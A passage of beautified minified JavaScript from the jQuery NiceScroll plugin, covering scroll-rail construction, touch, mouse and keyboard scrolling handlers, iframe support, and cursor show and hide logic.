                    background: a.opt.background,
                    cursor: "default"
                });
                f.visibility = !0;
                f.scrollable = !0;
                f.align = "left" == a.opt.railalign ? 0 : 1;
                a.rail = f;
                b = a.rail.drag = !1;
                a.opt.boxzoom && (!a.ispage && !d.isieold) && (b = document.createElement("div"),
                a.bind(b, "click", a.doZoom),
                a.zoom = e(b),
                a.zoom.css({
                    cursor: "pointer",
                    "z-index": a.zindex,
                    backgroundImage: "url(" + a.opt.scriptpath + "zoomico.png)",
                    height: 18,
                    width: 18,
                    backgroundPosition: "0px 0px"
                }),
                a.opt.dblclickzoom && a.bind(a.win, "dblclick", a.doZoom),
                d.cantouch && a.opt.gesturezoom && (a.ongesturezoom = function(c) {
                    1.5 < c.scale && a.doZoomIn(c);
                    0.8 > c.scale && a.doZoomOut(c);
                    return a.cancelEvent(c)
                }
                ,
                a.bind(a.win, "gestureend", a.ongesturezoom)));
                a.railh = !1;
                if (a.opt.horizrailenabled) {
                    a.css(c, {
                        "overflow-x": "hidden"
                    });
                    b = e(document.createElement("div"));
                    b.css({
                        position: "relative",
                        top: 0,
                        height: a.opt.cursorwidth,
                        width: "0px",
                        "background-color": a.opt.cursorcolor,
                        border: a.opt.cursorborder,
                        "background-clip": "padding-box",
                        "-webkit-border-radius": a.opt.cursorborderradius,
                        "-moz-border-radius": a.opt.cursorborderradius,
                        "border-radius": a.opt.cursorborderradius
                    });
                    b.wborder = parseFloat(b.outerWidth() - b.innerWidth());
                    a.cursorh = b;
                    var m = e(document.createElement("div"));
                    m.attr("id", a.id + "-hr");
                    m.addClass("nicescroll-rails");
                    m.height = Math.max(parseFloat(a.opt.cursorwidth), b.outerHeight());
                    m.css({
                        height: m.height + "px",
                        zIndex: a.zindex,
                        background: a.opt.background
                    });
                    m.append(b);
                    m.visibility = !0;
                    m.scrollable = !0;
                    m.align = "top" == a.opt.railvalign ? 0 : 1;
                    a.railh = m;
                    a.railh.drag = !1
                }
                a.ispage ? (f.css({
                    position: "fixed",
                    top: "0px",
                    height: "100%"
                }),
                f.align ? f.css({
                    right: "0px"
                }) : f.css({
                    left: "0px"
                }),
                a.body.append(f),
                a.railh && (m.css({
                    position: "fixed",
                    left: "0px",
                    width: "100%"
                }),
                m.align ? m.css({
                    bottom: "0px"
                }) : m.css({
                    top: "0px"
                }),
                a.body.append(m))) : (a.ishwscroll ? ("static" == a.win.css("position") && a.css(a.win, {
                    position: "relative"
                }),
                c = "HTML" == a.win[0].nodeName ? a.body : a.win,
                a.zoom && (a.zoom.css({
                    position: "absolute",
                    top: 1,
                    right: 0,
                    "margin-right": f.width + 4
                }),
                c.append(a.zoom)),
                f.css({
                    position: "absolute",
                    top: 0
                }),
                f.align ? f.css({
                    right: 0
                }) : f.css({
                    left: 0
                }),
                c.append(f),
                m && (m.css({
                    position: "absolute",
                    left: 0,
                    bottom: 0
                }),
                m.align ? m.css({
                    bottom: 0
                }) : m.css({
                    top: 0
                }),
                c.append(m))) : (a.isfixed = "fixed" == a.win.css("position"),
                c = a.isfixed ? "fixed" : "absolute",
                a.isfixed || (a.viewport = a.getViewport(a.win[0])),
                a.viewport && (a.body = a.viewport,
                !1 == /fixed|relative|absolute/.test(a.viewport.css("position")) && a.css(a.viewport, {
                    position: "relative"
                })),
                f.css({
                    position: c
                }),
                a.zoom && a.zoom.css({
                    position: c
                }),
                a.updateScrollBar(),
                a.body.append(f),
                a.zoom && a.body.append(a.zoom),
                a.railh && (m.css({
                    position: c
                }),
                a.body.append(m))),
                d.isios && a.css(a.win, {
                    "-webkit-tap-highlight-color": "rgba(0,0,0,0)",
                    "-webkit-touch-callout": "none"
                }),
                d.isie && a.opt.disableoutline && a.win.attr("hideFocus", "true"),
                d.iswebkit && a.opt.disableoutline && a.win.css({
                    outline: "none"
                }));
                !1 === a.opt.autohidemode ? (a.autohidedom = !1,
                a.rail.css({
                    opacity: a.opt.cursoropacitymax
                }),
                a.railh && a.railh.css({
                    opacity: a.opt.cursoropacitymax
                })) : !0 === a.opt.autohidemode || "leave" === a.opt.autohidemode ? (a.autohidedom = e().add(a.rail),
                d.isie8 && (a.autohidedom = a.autohidedom.add(a.cursor)),
                a.railh && (a.autohidedom = a.autohidedom.add(a.railh)),
                a.railh && d.isie8 && (a.autohidedom = a.autohidedom.add(a.cursorh))) : "scroll" == a.opt.autohidemode ? (a.autohidedom = e().add(a.rail),
                a.railh && (a.autohidedom = a.autohidedom.add(a.railh))) : "cursor" == a.opt.autohidemode ? (a.autohidedom = e().add(a.cursor),
                a.railh && (a.autohidedom = a.autohidedom.add(a.cursorh))) : "hidden" == a.opt.autohidemode && (a.autohidedom = !1,
                a.hide(),
                a.locked = !1);
                if (d.isie9mobile)
                    a.scrollmom = new H(a),
                    a.onmangotouch = function(c) {
                        c = a.getScrollTop();
                        var b = a.getScrollLeft();
                        if (c == a.scrollmom.lastscrolly && b == a.scrollmom.lastscrollx)
                            return !0;
                        var f = c - a.mangotouch.sy
                          , d = b - a.mangotouch.sx;
                        if (0 != Math.round(Math.sqrt(Math.pow(d, 2) + Math.pow(f, 2)))) {
                            var n = 0 > f ? -1 : 1
                              , e = 0 > d ? -1 : 1
                              , h = +new Date;
                            a.mangotouch.lazy && clearTimeout(a.mangotouch.lazy);
                            80 < h - a.mangotouch.tm || a.mangotouch.dry != n || a.mangotouch.drx != e ? (a.scrollmom.stop(),
                            a.scrollmom.reset(b, c),
                            a.mangotouch.sy = c,
                            a.mangotouch.ly = c,
                            a.mangotouch.sx = b,
                            a.mangotouch.lx = b,
                            a.mangotouch.dry = n,
                            a.mangotouch.drx = e,
                            a.mangotouch.tm = h) : (a.scrollmom.stop(),
                            a.scrollmom.update(a.mangotouch.sx - d, a.mangotouch.sy - f),
                            a.mangotouch.tm = h,
                            f = Math.max(Math.abs(a.mangotouch.ly - c), Math.abs(a.mangotouch.lx - b)),
                            a.mangotouch.ly = c,
                            a.mangotouch.lx = b,
                            2 < f && (a.mangotouch.lazy = setTimeout(function() {
                                a.mangotouch.lazy = !1;
                                a.mangotouch.dry = 0;
                                a.mangotouch.drx = 0;
                                a.mangotouch.tm = 0;
                                a.scrollmom.doMomentum(30)
                            }, 100)))
                        }
                    }
                    ,
                    f = a.getScrollTop(),
                    m = a.getScrollLeft(),
                    a.mangotouch = {
                        sy: f,
                        ly: f,
                        dry: 0,
                        sx: m,
                        lx: m,
                        drx: 0,
                        lazy: !1,
                        tm: 0
                    },
                    a.bind(a.docscroll, "scroll", a.onmangotouch);
                else {
                    if (d.cantouch || a.istouchcapable || a.opt.touchbehavior || d.hasmstouch) {
                        a.scrollmom = new H(a);
                        a.ontouchstart = function(c) {
                            if (c.pointerType && 2 != c.pointerType)
                                return !1;
                            a.hasmoving = !1;
                            if (!a.locked) {
                                if (d.hasmstouch)
                                    for (var b = c.target ? c.target : !1; b; ) {
                                        var f = e(b).getNiceScroll();
                                        if (0 < f.length && f[0].me == a.me)
                                            break;
                                        if (0 < f.length)
                                            return !1;
                                        if ("DIV" == b.nodeName && b.id == a.id)
                                            break;
                                        b = b.parentNode ? b.parentNode : !1
                                    }
                                a.cancelScroll();
                                if ((b = a.getTarget(c)) && /INPUT/i.test(b.nodeName) && /range/i.test(b.type))
                                    return a.stopPropagation(c);
                                !("clientX"in c) && "changedTouches"in c && (c.clientX = c.changedTouches[0].clientX,
                                c.clientY = c.changedTouches[0].clientY);
                                a.forcescreen && (f = c,
                                c = {
                                    original: c.original ? c.original : c
                                },
                                c.clientX = f.screenX,
                                c.clientY = f.screenY);
                                a.rail.drag = {
                                    x: c.clientX,
                                    y: c.clientY,
                                    sx: a.scroll.x,
                                    sy: a.scroll.y,
                                    st: a.getScrollTop(),
                                    sl: a.getScrollLeft(),
                                    pt: 2,
                                    dl: !1
                                };
                                if (a.ispage || !a.opt.directionlockdeadzone)
                                    a.rail.drag.dl = "f";
                                else {
                                    var f = e(window).width()
                                      , n = e(window).height()
                                      , h = Math.max(document.body.scrollWidth, document.documentElement.scrollWidth)
                                      , k = Math.max(document.body.scrollHeight, document.documentElement.scrollHeight)
                                      , n = Math.max(0, k - n)
                                      , f = Math.max(0, h - f);
                                    a.rail.drag.ck = !a.rail.scrollable && a.railh.scrollable ? 0 < n ? "v" : !1 : a.rail.scrollable && !a.railh.scrollable ? 0 < f ? "h" : !1 : !1;
                                    a.rail.drag.ck || (a.rail.drag.dl = "f")
                                }
                                a.opt.touchbehavior && (a.isiframe && d.isie) && (f = a.win.position(),
                                a.rail.drag.x += f.left,
                                a.rail.drag.y += f.top);
                                a.hasmoving = !1;
                                a.lastmouseup = !1;
                                a.scrollmom.reset(c.clientX, c.clientY);
                                if (!d.cantouch && !this.istouchcapable && !d.hasmstouch) {
                                    if (!b || !/INPUT|SELECT|TEXTAREA/i.test(b.nodeName))
                                        return !a.ispage && d.hasmousecapture && b.setCapture(),
                                        a.opt.touchbehavior ? (b.onclick && !b._onclick && (b._onclick = b.onclick,
                                        b.onclick = function(c) {
                                            if (a.hasmoving)
                                                return !1;
                                            b._onclick.call(this, c)
                                        }
                                        ),
                                        a.cancelEvent(c)) : a.stopPropagation(c);
                                    /SUBMIT|CANCEL|BUTTON/i.test(e(b).attr("type")) && (pc = {
                                        tg: b,
                                        click: !1
                                    },
                                    a.preventclick = pc)
                                }
                            }
                        }
                        ;
                        a.ontouchend = function(c) {
                            if (c.pointerType && 2 != c.pointerType)
                                return !1;
                            if (a.rail.drag && 2 == a.rail.drag.pt && (a.scrollmom.doMomentum(),
                            a.rail.drag = !1,
                            a.hasmoving && (a.lastmouseup = !0,
                            a.hideCursor(),
                            d.hasmousecapture && document.releaseCapture(),
                            !d.cantouch)))
                                return a.cancelEvent(c)
                        }
                        ;
                        var q = a.opt.touchbehavior && a.isiframe && !d.hasmousecapture;
                        a.ontouchmove = function(c, b) {
                            if (c.pointerType && 2 != c.pointerType)
                                return !1;
                            if (a.rail.drag && 2 == a.rail.drag.pt) {
                                if (d.cantouch && "undefined" == typeof c.original)
                                    return !0;
                                a.hasmoving = !0;
                                a.preventclick && !a.preventclick.click && (a.preventclick.click = a.preventclick.tg.onclick || !1,
                                a.preventclick.tg.onclick = a.onpreventclick);
                                c = e.extend({
                                    original: c
                                }, c);
                                "changedTouches"in c && (c.clientX = c.changedTouches[0].clientX,
                                c.clientY = c.changedTouches[0].clientY);
                                if (a.forcescreen) {
                                    var f = c;
                                    c = {
                                        original: c.original ? c.original : c
                                    };
                                    c.clientX = f.screenX;
                                    c.clientY = f.screenY
                                }
                                f = ofy = 0;
                                if (q && !b) {
                                    var n = a.win.position()
                                      , f = -n.left;
                                    ofy = -n.top
                                }
                                var h = c.clientY + ofy
                                  , n = h - a.rail.drag.y
                                  , k = c.clientX + f
                                  , u = k - a.rail.drag.x
                                  , g = a.rail.drag.st - n;
                                a.ishwscroll && a.opt.bouncescroll ? 0 > g ? g = Math.round(g / 2) : g > a.page.maxh && (g = a.page.maxh + Math.round((g - a.page.maxh) / 2)) : (0 > g && (h = g = 0),
                                g > a.page.maxh && (g = a.page.maxh,
                                h = 0));
                                if (a.railh && a.railh.scrollable) {
                                    var l = a.rail.drag.sl - u;
                                    a.ishwscroll && a.opt.bouncescroll ? 0 > l ? l = Math.round(l / 2) : l > a.page.maxw && (l = a.page.maxw + Math.round((l - a.page.maxw) / 2)) : (0 > l && (k = l = 0),
                                    l > a.page.maxw && (l = a.page.maxw,
                                    k = 0))
                                }
                                f = !1;
                                if (a.rail.drag.dl)
                                    f = !0,
                                    "v" == a.rail.drag.dl ? l = a.rail.drag.sl : "h" == a.rail.drag.dl && (g = a.rail.drag.st);
                                else {
                                    var n = Math.abs(n)
                                      , u = Math.abs(u)
                                      , m = a.opt.directionlockdeadzone;
                                    if ("v" == a.rail.drag.ck) {
                                        if (n > m && u <= 0.3 * n)
                                            return a.rail.drag = !1,
                                            !0;
                                        u > m && (a.rail.drag.dl = "f",
                                        e("body").scrollTop(e("body").scrollTop()))
                                    } else if ("h" == a.rail.drag.ck) {
                                        if (u > m && n <= 0.3 * u)
                                            return a.rail.drag = !1,
                                            !0;
                                        n > m && (a.rail.drag.dl = "f",
                                        e("body").scrollLeft(e("body").scrollLeft()))
                                    }
                                }
                                a.synched("touchmove", function() {
                                    a.rail.drag && 2 == a.rail.drag.pt && (a.prepareTransition && a.prepareTransition(0),
                                    a.rail.scrollable && a.setScrollTop(g),
                                    a.scrollmom.update(k, h),
                                    a.railh && a.railh.scrollable ? (a.setScrollLeft(l),
                                    a.showCursor(g, l)) : a.showCursor(g),
                                    d.isie10 && document.selection.clear())
                                });
                                d.ischrome && a.istouchcapable && (f = !1);
                                if (f)
                                    return a.cancelEvent(c)
                            }
                        }
                    }
                    a.onmousedown = function(c, b) {
                        if (!(a.rail.drag && 1 != a.rail.drag.pt)) {
                            if (a.locked)
                                return a.cancelEvent(c);
                            a.cancelScroll();
                            a.rail.drag = {
                                x: c.clientX,
                                y: c.clientY,
                                sx: a.scroll.x,
                                sy: a.scroll.y,
                                pt: 1,
                                hr: !!b
                            };
                            var f = a.getTarget(c);
                            !a.ispage && d.hasmousecapture && f.setCapture();
                            a.isiframe && !d.hasmousecapture && (a.saved.csspointerevents = a.doc.css("pointer-events"),
                            a.css(a.doc, {
                                "pointer-events": "none"
                            }));
                            a.hasmoving = !1;
                            return a.cancelEvent(c)
                        }
                    }
                    ;
                    a.onmouseup = function(c) {
                        if (a.rail.drag && (d.hasmousecapture && document.releaseCapture(),
                        a.isiframe && !d.hasmousecapture && a.doc.css("pointer-events", a.saved.csspointerevents),
                        1 == a.rail.drag.pt))
                            return a.rail.drag = !1,
                            a.hasmoving && a.triggerScrollEnd(),
                            a.cancelEvent(c)
                    }
                    ;
                    a.onmousemove = function(c) {
                        if (a.rail.drag && 1 == a.rail.drag.pt) {
                            if (d.ischrome && 0 == c.which)
                                return a.onmouseup(c);
                            a.cursorfreezed = !0;
                            a.hasmoving = !0;
                            if (a.rail.drag.hr) {
                                a.scroll.x = a.rail.drag.sx + (c.clientX - a.rail.drag.x);
                                0 > a.scroll.x && (a.scroll.x = 0);
                                var b = a.scrollvaluemaxw;
                                a.scroll.x > b && (a.scroll.x = b)
                            } else
                                a.scroll.y = a.rail.drag.sy + (c.clientY - a.rail.drag.y),
                                0 > a.scroll.y && (a.scroll.y = 0),
                                b = a.scrollvaluemax,
                                a.scroll.y > b && (a.scroll.y = b);
                            a.synched("mousemove", function() {
                                a.rail.drag && 1 == a.rail.drag.pt && (a.showCursor(),
                                a.rail.drag.hr ? a.doScrollLeft(Math.round(a.scroll.x * a.scrollratio.x), a.opt.cursordragspeed) : a.doScrollTop(Math.round(a.scroll.y * a.scrollratio.y), a.opt.cursordragspeed))
                            });
                            return a.cancelEvent(c)
                        }
                    }
                    ;
                    if (d.cantouch || a.opt.touchbehavior)
                        a.onpreventclick = function(c) {
                            if (a.preventclick)
                                return a.preventclick.tg.onclick = a.preventclick.click,
                                a.preventclick = !1,
                                a.cancelEvent(c)
                        }
                        ,
                        a.bind(a.win, "mousedown", a.ontouchstart),
                        a.onclick = d.isios ? !1 : function(c) {
                            return a.lastmouseup ? (a.lastmouseup = !1,
                            a.cancelEvent(c)) : !0
                        }
                        ,
                        a.opt.grabcursorenabled && d.cursorgrabvalue && (a.css(a.ispage ? a.doc : a.win, {
                            cursor: d.cursorgrabvalue
                        }),
                        a.css(a.rail, {
                            cursor: d.cursorgrabvalue
                        }));
                    else {
                        var p = function(c) {
                            if (a.selectiondrag) {
                                if (c) {
                                    var b = a.win.outerHeight();
                                    c = c.pageY - a.selectiondrag.top;
                                    0 < c && c < b && (c = 0);
                                    c >= b && (c -= b);
                                    a.selectiondrag.df = c
                                }
                                0 != a.selectiondrag.df && (a.doScrollBy(2 * -Math.floor(a.selectiondrag.df / 6)),
                                a.debounced("doselectionscroll", function() {
                                    p()
                                }, 50))
                            }
                        };
                        a.hasTextSelected = "getSelection"in document ? function() {
                            return 0 < document.getSelection().rangeCount
                        }
                        : "selection"in document ? function() {
                            return "None" != document.selection.type
                        }
                        : function() {
                            return !1
                        }
                        ;
                        a.onselectionstart = function(c) {
                            a.ispage || (a.selectiondrag = a.win.offset())
                        }
                        ;
                        a.onselectionend = function(c) {
                            a.selectiondrag = !1
                        }
                        ;
                        a.onselectiondrag = function(c) {
                            a.selectiondrag && a.hasTextSelected() && a.debounced("selectionscroll", function() {
                                p(c)
                            }, 250)
                        }
                    }
                    d.hasmstouch && (a.css(a.rail, {
                        "-ms-touch-action": "none"
                    }),
                    a.css(a.cursor, {
                        "-ms-touch-action": "none"
                    }),
                    a.bind(a.win, "MSPointerDown", a.ontouchstart),
                    a.bind(document, "MSPointerUp", a.ontouchend),
                    a.bind(document, "MSPointerMove", a.ontouchmove),
                    a.bind(a.cursor, "MSGestureHold", function(a) {
                        a.preventDefault()
                    }),
                    a.bind(a.cursor, "contextmenu", function(a) {
                        a.preventDefault()
                    }));
                    this.istouchcapable && (a.bind(a.win, "touchstart", a.ontouchstart),
                    a.bind(document, "touchend", a.ontouchend),
                    a.bind(document, "touchcancel", a.ontouchend),
                    a.bind(document, "touchmove", a.ontouchmove));
                    a.bind(a.cursor, "mousedown", a.onmousedown);
                    a.bind(a.cursor, "mouseup", a.onmouseup);
                    a.railh && (a.bind(a.cursorh, "mousedown", function(c) {
                        a.onmousedown(c, !0)
                    }),
                    a.bind(a.cursorh, "mouseup", a.onmouseup));
                    if (a.opt.cursordragontouch || !d.cantouch && !a.opt.touchbehavior)
                        a.rail.css({
                            cursor: "default"
                        }),
                        a.railh && a.railh.css({
                            cursor: "default"
                        }),
                        a.jqbind(a.rail, "mouseenter", function() {
                            if (!a.win.is(":visible"))
                                return !1;
                            a.canshowonmouseevent && a.showCursor();
                            a.rail.active = !0
                        }),
                        a.jqbind(a.rail, "mouseleave", function() {
                            a.rail.active = !1;
                            a.rail.drag || a.hideCursor()
                        }),
                        a.opt.sensitiverail && (a.bind(a.rail, "click", function(c) {
                            a.doRailClick(c, !1, !1)
                        }),
                        a.bind(a.rail, "dblclick", function(c) {
                            a.doRailClick(c, !0, !1)
                        }),
                        a.bind(a.cursor, "click", function(c) {
                            a.cancelEvent(c)
                        }),
                        a.bind(a.cursor, "dblclick", function(c) {
                            a.cancelEvent(c)
                        })),
                        a.railh && (a.jqbind(a.railh, "mouseenter", function() {
                            if (!a.win.is(":visible"))
                                return !1;
                            a.canshowonmouseevent && a.showCursor();
                            a.rail.active = !0
                        }),
                        a.jqbind(a.railh, "mouseleave", function() {
                            a.rail.active = !1;
                            a.rail.drag || a.hideCursor()
                        }),
                        a.opt.sensitiverail && (a.bind(a.railh, "click", function(c) {
                            a.doRailClick(c, !1, !0)
                        }),
                        a.bind(a.railh, "dblclick", function(c) {
                            a.doRailClick(c, !0, !0)
                        }),
                        a.bind(a.cursorh, "click", function(c) {
                            a.cancelEvent(c)
                        }),
                        a.bind(a.cursorh, "dblclick", function(c) {
                            a.cancelEvent(c)
                        })));
                    !d.cantouch && !a.opt.touchbehavior ? (a.bind(d.hasmousecapture ? a.win : document, "mouseup", a.onmouseup),
                    a.bind(document, "mousemove", a.onmousemove),
                    a.onclick && a.bind(document, "click", a.onclick),
                    !a.ispage && a.opt.enablescrollonselection && (a.bind(a.win[0], "mousedown", a.onselectionstart),
                    a.bind(document, "mouseup", a.onselectionend),
                    a.bind(a.cursor, "mouseup", a.onselectionend),
                    a.cursorh && a.bind(a.cursorh, "mouseup", a.onselectionend),
                    a.bind(document, "mousemove", a.onselectiondrag)),
                    a.zoom && (a.jqbind(a.zoom, "mouseenter", function() {
                        a.canshowonmouseevent && a.showCursor();
                        a.rail.active = !0
                    }),
                    a.jqbind(a.zoom, "mouseleave", function() {
                        a.rail.active = !1;
                        a.rail.drag || a.hideCursor()
                    }))) : (a.bind(d.hasmousecapture ? a.win : document, "mouseup", a.ontouchend),
                    a.bind(document, "mousemove", a.ontouchmove),
                    a.onclick && a.bind(document, "click", a.onclick),
                    a.opt.cursordragontouch && (a.bind(a.cursor, "mousedown", a.onmousedown),
                    a.bind(a.cursor, "mousemove", a.onmousemove),
                    a.cursorh && a.bind(a.cursorh, "mousedown", function(c) {
                        a.onmousedown(c, !0)
                    }),
                    a.cursorh && a.bind(a.cursorh, "mousemove", a.onmousemove)));
                    a.opt.enablemousewheel && (a.isiframe || a.bind(d.isie && a.ispage ? document : a.win, "mousewheel", a.onmousewheel),
                    a.bind(a.rail, "mousewheel", a.onmousewheel),
                    a.railh && a.bind(a.railh, "mousewheel", a.onmousewheelhr));
                    !a.ispage && (!d.cantouch && !/HTML|^BODY/.test(a.win[0].nodeName)) && (a.win.attr("tabindex") || a.win.attr({
                        tabindex: J++
                    }),
                    a.jqbind(a.win, "focus", function(c) {
                        y = a.getTarget(c).id || !0;
                        a.hasfocus = !0;
                        a.canshowonmouseevent && a.noticeCursor()
                    }),
                    a.jqbind(a.win, "blur", function(c) {
                        y = !1;
                        a.hasfocus = !1
                    }),
                    a.jqbind(a.win, "mouseenter", function(c) {
                        C = a.getTarget(c).id || !0;
                        a.hasmousefocus = !0;
                        a.canshowonmouseevent && a.noticeCursor()
                    }),
                    a.jqbind(a.win, "mouseleave", function() {
                        C = !1;
                        a.hasmousefocus = !1;
                        a.rail.drag || a.hideCursor()
                    }))
                }
                a.onkeypress = function(c) {
                    if (a.locked && 0 == a.page.maxh)
                        return !0;
                    c = c ? c : window.e;
                    var b = a.getTarget(c);
                    if (b && /INPUT|TEXTAREA|SELECT|OPTION/.test(b.nodeName) && (!b.getAttribute("type") && !b.type || !/submit|button|cancel/i.tp) || e(b).attr("contenteditable"))
                        return !0;
                    if (a.hasfocus || a.hasmousefocus && !y || a.ispage && !y && !C) {
                        b = c.keyCode;
                        if (a.locked && 27 != b)
                            return a.cancelEvent(c);
                        var f = c.ctrlKey || !1
                          , n = c.shiftKey || !1
                          , d = !1;
                        switch (b) {
                        case 38:
                        case 63233:
                            a.doScrollBy(72);
                            d = !0;
                            break;
                        case 40:
                        case 63235:
                            a.doScrollBy(-72);
                            d = !0;
                            break;
                        case 37:
                        case 63232:
                            a.railh && (f ? a.doScrollLeft(0) : a.doScrollLeftBy(72),
                            d = !0);
                            break;
                        case 39:
                        case 63234:
                            a.railh && (f ? a.doScrollLeft(a.page.maxw) : a.doScrollLeftBy(-72),
                            d = !0);
                            break;
                        case 33:
                        case 63276:
                            a.doScrollBy(a.view.h);
                            d = !0;
                            break;
                        case 34:
                        case 63277:
                            a.doScrollBy(-a.view.h);
                            d = !0;
                            break;
                        case 36:
                        case 63273:
                            a.railh && f ? a.doScrollPos(0, 0) : a.doScrollTo(0);
                            d = !0;
                            break;
                        case 35:
                        case 63275:
                            a.railh && f ? a.doScrollPos(a.page.maxw, a.page.maxh) : a.doScrollTo(a.page.maxh);
                            d = !0;
                            break;
                        case 32:
                            a.opt.spacebarenabled && (n ? a.doScrollBy(a.view.h) : a.doScrollBy(-a.view.h),
                            d = !0);
                            break;
                        case 27:
                            a.zoomactive && (a.doZoom(),
                            d = !0)
                        }
                        if (d)
                            return a.cancelEvent(c)
                    }
                }
                ;
                a.opt.enablekeyboard && a.bind(document, d.isopera && !d.isopera12 ? "keypress" : "keydown", a.onkeypress);
                a.bind(document, "keydown", function(c) {
                    c.ctrlKey && (a.wheelprevented = !0)
                });
                a.bind(document, "keyup", function(c) {
                    c.ctrlKey || (a.wheelprevented = !1)
                });
                a.bind(window, "resize", a.lazyResize);
                a.bind(window, "orientationchange", a.lazyResize);
                a.bind(window, "load", a.lazyResize);
                if (d.ischrome && !a.ispage && !a.haswrapper) {
                    var r = a.win.attr("style")
                      , f = parseFloat(a.win.css("width")) + 1;
                    a.win.css("width", f);
                    a.synched("chromefix", function() {
                        a.win.attr("style", r)
                    })
                }
                a.onAttributeChange = function(c) {
                    a.lazyResize(250)
                }
                ;
                !a.ispage && !a.haswrapper && (!1 !== z ? (a.observer = new z(function(c) {
                    c.forEach(a.onAttributeChange)
                }
                ),
                a.observer.observe(a.win[0], {
                    childList: !0,
                    characterData: !1,
                    attributes: !0,
                    subtree: !1
                }),
                a.observerremover = new z(function(c) {
                    c.forEach(function(c) {
                        if (0 < c.removedNodes.length)
                            for (var b in c.removedNodes)
                                if (c.removedNodes[b] == a.win[0])
                                    return a.remove()
                    })
                }
                ),
                a.observerremover.observe(a.win[0].parentNode, {
                    childList: !0,
                    characterData: !1,
                    attributes: !1,
                    subtree: !1
                })) : (a.bind(a.win, d.isie && !d.isie9 ? "propertychange" : "DOMAttrModified", a.onAttributeChange),
                d.isie9 && a.win[0].attachEvent("onpropertychange", a.onAttributeChange),
                a.bind(a.win, "DOMNodeRemoved", function(c) {
                    c.target == a.win[0] && a.remove()
                })));
                !a.ispage && a.opt.boxzoom && a.bind(window, "resize", a.resizeZoom);
                a.istextarea && a.bind(a.win, "mouseup", a.lazyResize);
                a.lazyResize(30)
            }
            if ("IFRAME" == this.doc[0].nodeName) {
                var I = function(c) {
                    a.iframexd = !1;
                    try {
                        var b = "contentDocument"in this ? this.contentDocument : this.contentWindow.document
                    } catch (f) {
                        a.iframexd = !0,
                        b = !1
                    }
                    if (a.iframexd)
                        return "console"in window && console.log("NiceScroll error: policy restriced iframe"),
                        !0;
                    a.forcescreen = !0;
                    a.isiframe && (a.iframe = {
                        doc: e(b),
                        html: a.doc.contents().find("html")[0],
                        body: a.doc.contents().find("body")[0]
                    },
                    a.getContentSize = function() {
                        return {
                            w: Math.max(a.iframe.html.scrollWidth, a.iframe.body.scrollWidth),
                            h: Math.max(a.iframe.html.scrollHeight, a.iframe.body.scrollHeight)
                        }
                    }
                    ,
                    a.docscroll = e(a.iframe.body));
                    !d.isios && (a.opt.iframeautoresize && !a.isiframe) && (a.win.scrollTop(0),
                    a.doc.height(""),
                    c = Math.max(b.getElementsByTagName("html")[0].scrollHeight, b.body.scrollHeight),
                    a.doc.height(c));
                    a.lazyResize(30);
                    d.isie7 && a.css(e(a.iframe.html), {
                        "overflow-y": "hidden"
                    });
                    a.css(e(a.iframe.body), {
                        "overflow-y": "hidden"
                    });
                    d.isios && a.haswrapper && a.css(e(b.body), {
                        "-webkit-transform": "translate3d(0,0,0)"
                    });
                    "contentWindow"in this ? a.bind(this.contentWindow, "scroll", a.onscroll) : a.bind(b, "scroll", a.onscroll);
                    a.opt.enablemousewheel && a.bind(b, "mousewheel", a.onmousewheel);
                    a.opt.enablekeyboard && a.bind(b, d.isopera ? "keypress" : "keydown", a.onkeypress);
                    if (d.cantouch || a.opt.touchbehavior)
                        a.bind(b, "mousedown", a.ontouchstart),
                        a.bind(b, "mousemove", function(c) {
                            a.ontouchmove(c, !0)
                        }),
                        a.opt.grabcursorenabled && d.cursorgrabvalue && a.css(e(b.body), {
                            cursor: d.cursorgrabvalue
                        });
                    a.bind(b, "mouseup", a.ontouchend);
                    a.zoom && (a.opt.dblclickzoom && a.bind(b, "dblclick", a.doZoom),
                    a.ongesturezoom && a.bind(b, "gestureend", a.ongesturezoom))
                };
                this.doc[0].readyState && "complete" == this.doc[0].readyState && setTimeout(function() {
                    I.call(a.doc[0], !1)
                }, 500);
                a.bind(this.doc, "load", I)
            }
        }
        ;
        this.showCursor = function(c, b) {
            a.cursortimeout && (clearTimeout(a.cursortimeout),
            a.cursortimeout = 0);
            if (a.rail) {
                a.autohidedom && (a.autohidedom.stop().css({
                    opacity: a.opt.cursoropacitymax
                }),
                a.cursoractive = !0);
                if (!a.rail.drag || 1 != a.rail.drag.pt)
                    "undefined" != typeof c && !1 !== c && (a.scroll.y = Math.round(1 * c / a.scrollratio.y)),
                    "undefined" != typeof b && (a.scroll.x = Math.round(1 * b / a.scrollratio.x));
                a.cursor.css({
                    height: a.cursorheight,
                    top: a.scroll.y
                });
                a.cursorh && (!a.rail.align && a.rail.visibility ? a.cursorh.css({
                    width: a.cursorwidth,
                    left: a.scroll.x + a.rail.width
                }) : a.cursorh.css({
                    width: a.cursorwidth,
                    left: a.scroll.x
                }),
                a.cursoractive = !0);
                a.zoom && a.zoom.stop().css({
                    opacity: a.opt.cursoropacitymax
                })
            }
        }
        ;
        this.hideCursor = function(c) {
            !a.cursortimeout && (a.rail && a.autohidedom && !(a.hasmousefocus && "leave" == a.opt.autohidemode)) && (a.cursortimeout = setTimeout(function() {
                if (!a.rail.active || !a.showonmouseevent)
                    a.autohidedom.stop().animate({
                        opacity: a.opt.cursoropacitymin
                    }),
                    a.zoom && a.zoom.stop().animate({
                        opacity: a.opt.cursoropacitymin
                    }),
                    a.cursoractive = !1;
                a.cursortimeout = 0
            }, c || a.opt.hidecursordelay))
        }
        ;
        this.noticeCursor = function(c, b, f) {
            a.showCursor(b, f);
            a.rail.active || a.hideCursor(c)
        }
        ;
        this.getContentSize = a.ispage ? function() {
            return {
                w: Math.max(document.body.scrollWidth, document.documentElement.scrollWidth),
                h: Math.max(document.body.scrollHeight, document.documentElement.scrollHeight)
            }
        }
        : a.haswrapper ? function() {
            return {
                w: a.doc.outerWidth() + parseInt(a.win.css("paddingLeft")) + parseInt(a.win.css("paddingRight")),
                h: a.doc.outerHeight() + parseInt(a.win.css("paddingTop")) + parseInt(a.win.css("paddingBottom"))
            }
        }
        : function() {
            return {
                w: a.docscroll[0].scrollWidth,
                h: a.docscroll[0].scrollHeight
            }
        }
        ;
        this.onResize = function(c, b) {
            if (!a || !a.win)
                return !1;
            if (!a.haswrapper && !a.ispage) {
                if ("none" == a.win.css("display"))
                    return a.visibility && a.hideRail().hideRailHr(),
                    !1;
                !a.hidden && !a.visibility && a.showRail().showRailHr()
            }
            var f = a.page.maxh
              , d = a.page.maxw
              , e = a.view.w;
            a.view = {
                w: a.ispage ? a.win.width() : parseInt(a.win[0].clientWidth),
                h: a.ispage ? a.win.height() : parseInt(a.win[0].clientHeight)
            };
